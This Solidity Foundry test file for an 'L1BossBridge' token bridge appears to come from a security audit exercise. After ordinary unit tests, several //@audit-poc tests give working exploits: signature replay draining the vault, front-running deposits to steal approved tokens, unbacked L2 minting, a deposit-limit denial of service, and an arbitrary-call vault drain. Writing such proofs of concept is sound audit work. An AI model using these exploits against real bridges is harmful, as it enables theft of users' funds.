// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
import { Pausable } from "@openzeppelin/contracts/utils/Pausable.sol";
import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
import { L1Token } from "../src/L1Token.sol";

contract L1BossBridgeTest is Test {
    event Deposit(address from, address to, uint256 amount);

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address userInL2 = makeAddr("userInL2");
    Account operator = makeAccount("operator");
    address newUser = makeAddr("new user");
    address newUserL2 = makeAddr("new user L2");

    L1Token token;
    L1BossBridge tokenBridge;
    L1Vault vault;

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy token and transfer the user some initial balance
        token = new L1Token();
        token.transfer(address(user), 1000e18);
        //@note added for replay attack
        token.transfer(address(newUser), 100e18);

        // Deploy bridge
        tokenBridge = new L1BossBridge(IERC20(token));
        vault = tokenBridge.vault();

        // Add a new allowed signer to the bridge
        tokenBridge.setSigner(operator.addr, true);

        vm.stopPrank();
    }

    function testDeployerOwnsBridge() public {
        address owner = tokenBridge.owner();
        assertEq(owner, deployer);
    }

    function testBridgeOwnsVault() public {
        address owner = vault.owner();
        assertEq(owner, address(tokenBridge));
    }

    function testTokenIsSetInBridgeAndVault() public {
        assertEq(address(tokenBridge.token()), address(token));
        assertEq(address(vault.token()), address(token));
    }

    function testVaultInfiniteAllowanceToBridge() public {
        assertEq(token.allowance(address(vault), address(tokenBridge)), type(uint256).max);
    }

    function testOnlyOwnerCanPauseBridge() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());
    }

    function testNonOwnerCannotPauseBridge() public {
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.pause();
    }

    function testOwnerCanUnpauseBridge() public {
        vm.startPrank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());

        tokenBridge.unpause();
        assertFalse(tokenBridge.paused());
        vm.stopPrank();
    }

    function testNonOwnerCannotUnpauseBridge() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();
        assertTrue(tokenBridge.paused());

        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.unpause();
    }

    function testInitialSignerWasRegistered() public {
        assertTrue(tokenBridge.signers(operator.addr));
    }

    function testNonOwnerCannotAddSigner() public {
        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
        tokenBridge.setSigner(operator.addr, true);
    }

    function testUserCannotDepositWhenBridgePaused() public {
        vm.prank(tokenBridge.owner());
        tokenBridge.pause();

        vm.startPrank(user);
        uint256 amount = 10e18;
        token.approve(address(tokenBridge), amount);

        vm.expectRevert(Pausable.EnforcedPause.selector);
        tokenBridge.depositTokensToL2(user, userInL2, amount);
        vm.stopPrank();
    }

    function testUserCanDepositTokens() public {
        vm.startPrank(user);
        uint256 amount = 10e18;
        token.approve(address(tokenBridge), amount);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, userInL2, amount);
        tokenBridge.depositTokensToL2(user, userInL2, amount);

        assertEq(token.balanceOf(address(tokenBridge)), 0);
        assertEq(token.balanceOf(address(vault)), amount);
        vm.stopPrank();
    }

    function testUserCannotDepositBeyondLimit() public {
        vm.startPrank(user);
        uint256 amount = tokenBridge.DEPOSIT_LIMIT() + 1;
        deal(address(token), user, amount);
        token.approve(address(tokenBridge), amount);

        vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
        tokenBridge.depositTokensToL2(user, userInL2, amount);
        vm.stopPrank();
    }

    function testUserCanWithdrawTokensWithOperatorSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);

        assertEq(token.balanceOf(address(user)), userInitialBalance);
        assertEq(token.balanceOf(address(vault)), 0);
    }

    function testUserCannotWithdrawTokensWithUnknownOperatorSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        assertEq(token.balanceOf(address(vault)), depositAmount);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        (uint8 v, bytes32 r, bytes32 s) =
            _signMessage(_getTokenWithdrawalMessage(user, depositAmount), makeAccount("unknownOperator").key);

        vm.expectRevert(L1BossBridge.L1BossBridge__Unauthorized.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function testUserCannotWithdrawTokensWithInvalidSignature() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
        uint8 v = 0;
        bytes32 r = 0;
        bytes32 s = 0;

        vm.expectRevert(ECDSA.ECDSAInvalidSignature.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function testUserCannotWithdrawTokensWhenBridgePaused() public {
        vm.startPrank(user);
        uint256 depositAmount = 10e18;

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        vm.startPrank(tokenBridge.owner());
        tokenBridge.pause();

        vm.expectRevert(Pausable.EnforcedPause.selector);
        tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
    }

    function _getTokenWithdrawalMessage(address recipient, uint256 amount) private view returns (bytes memory) {
        return abi.encode(
            address(token), // target
            0, // value
            abi.encodeCall(IERC20.transferFrom, (address(vault), recipient, amount)) // data
        );
    }

    /**
     * Mocks part of the off-chain mechanism where there operator approves requests for withdrawals by signing them.
     * Although not coded here (for simplicity), you can safely assume that our operator refuses to sign any withdrawal
     * request from an account that never originated a transaction containing a successful deposit.
     */
    function _signMessage(
        bytes memory message,
        uint256 privateKey
    )
        private
        pure
        returns (uint8 v, bytes32 r, bytes32 s)
    {
        return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
    }

    //@audit-poc
    function test_user_attacks_replay_signature() public {
        uint256 amountToDeposit = 100e18;
        deal(address(token), address(this), amountToDeposit);
        token.approve(address(tokenBridge), amountToDeposit);
        tokenBridge.depositTokensToL2(address(this), newUserL2, amountToDeposit);

        assertEq(token.balanceOf(address(vault)), amountToDeposit);

        vm.startPrank(user);
        uint256 depositAmount = 10e18;
        uint256 userInitialBalance = token.balanceOf(address(user));

        token.approve(address(tokenBridge), depositAmount);
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);

        //total tokens present in vault
        assertEq(token.balanceOf(address(vault)), depositAmount + amountToDeposit);
        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);

        //operator is signing the message
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
        //using the signature to withdraw the tokens
        //replaying the signature to withdraw the tokens again and again
        while (token.balanceOf(address(vault)) >= depositAmount) {
            tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
        }
        //user now owns double of the deposit amount
        assertGt(token.balanceOf(address(user)), userInitialBalance);
        //valut has lost an extra of depositAmount in the exploit
        assertEq(token.balanceOf(address(vault)), 0);
    }

    //@audit-poc
    function test_attack_withdraw_more_than_deposits() external {
        uint256 amountToDeposit = 100e18;
        deal(address(token), address(vault), amountToDeposit);

        assertEq(token.balanceOf(address(vault)), amountToDeposit);

        //user deposits some amount to the vault
        vm.startPrank(user);
        token.approve(address(tokenBridge), 20e18);
        tokenBridge.depositTokensToL2(user, userInL2, 20e18);
        vm.stopPrank();

        //user withdraws the more amount than deposited
        uint256 amountToWithdraw = 40e18;
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, amountToWithdraw), operator.key);
        uint256 userInitialBalance = token.balanceOf(user);

        tokenBridge.withdrawTokensToL1(user, amountToWithdraw, v, r, s);

        assertEq(token.balanceOf(user), userInitialBalance + amountToWithdraw);
    }

    //@audit-poc
    function test_depositTokensToL2_called_by_random_address_causing_MEV() external {
        uint256 amountToDeposit = 100e18;
        vm.prank(newUser);
        token.approve(address(tokenBridge), amountToDeposit);

        assertEq(token.balanceOf(newUser), amountToDeposit);

        //attacker has initiated the deposit for a user and replaced the recipient address with his own address
        vm.prank(user);
        tokenBridge.depositTokensToL2(newUser, userInL2, amountToDeposit);

        assertEq(token.balanceOf(address(vault)), amountToDeposit);
        assertEq(token.balanceOf(newUser), 0);

        //attacker then calls the withdraw on behalf of the legit user to steal all their money
        uint256 amountToWithdraw = amountToDeposit;
        uint256 userInitialBalance = token.balanceOf(user);
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, amountToWithdraw), operator.key);
        tokenBridge.withdrawTokensToL1(user, amountToWithdraw, v, r, s);

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(user), userInitialBalance + amountToDeposit);
    }

    //@audit-poc
    function testCanMoveApprovedTokensOfOtherUsers_MEV() external {
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        //Bob front-runs the transaction and replaces the alice's L2 recipient address with his own
        address attacker = makeAddr("attacker");
        uint256 amountToDeposit = token.balanceOf(user);

        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attacker, amountToDeposit);

        vm.prank(attacker);
        tokenBridge.depositTokensToL2(user, attacker, amountToDeposit);

        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(address(vault)), amountToDeposit);
    }

    //@audit-poc
    function testCanTransferFromVaultToVault() external {
        address attacker = makeAddr("attacker");

        uint256 vaultBalance = 500 ether;
        deal(address(token), address(vault), vaultBalance);
        vm.expectEmit(address(tokenBridge));
        vm.prank(attacker);
        //Self transferring tokens from vault to vault
        emit Deposit(address(vault), attacker, vaultBalance);
        //@note can do this forever, mint infinite tokens on the L2
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
    }

    //@audit-poc
    function testDOSAttackWhenDepositLimitIsReached() external {
        address attacker = address(this);
        deal(address(token), attacker, tokenBridge.DEPOSIT_LIMIT());

        vm.prank(attacker);
        token.transfer(address(vault), tokenBridge.DEPOSIT_LIMIT());

        vm.startPrank(user);
        token.approve(address(tokenBridge), 1 ether);
        vm.expectRevert("L1BossBridge__DepositLimitReached()");
        tokenBridge.depositTokensToL2(user, userInL2, 1 ether);
        vm.stopPrank();
    }

    //@audit-poc
    function testAttackerMakingAnArbitraryLowLevelCall() external {
        uint256 intialVaultBalance = 100e18;
        deal(address(token), address(this), intialVaultBalance);
        token.approve(address(tokenBridge), intialVaultBalance);
        tokenBridge.depositTokensToL2(address(this), newUserL2, intialVaultBalance);

        address attacker = makeAddr("attacker");
        bytes memory data = abi.encodeCall(L1Vault.approveTo, (attacker, type(uint256).max));
        bytes memory messageHash = abi.encode(
            address(vault), // target
            0, // value
            data // data
        );

        (uint8 v, bytes32 r, bytes32 s) = _signMessage(messageHash, operator.key);
        vm.startPrank(attacker);

        // making a fake deposit to bypass the withdraw constraint
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(attacker), address(0), 0);
        tokenBridge.depositTokensToL2(attacker, address(0), 0);
        
        assertEq(token.balanceOf(attacker), 0);
        // attacker now calling the sendToL1
        tokenBridge.sendToL1(v, r, s, messageHash);
        token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
        vm.stopPrank();

        assertEq(token.balanceOf(attacker), intialVaultBalance);
    }
}
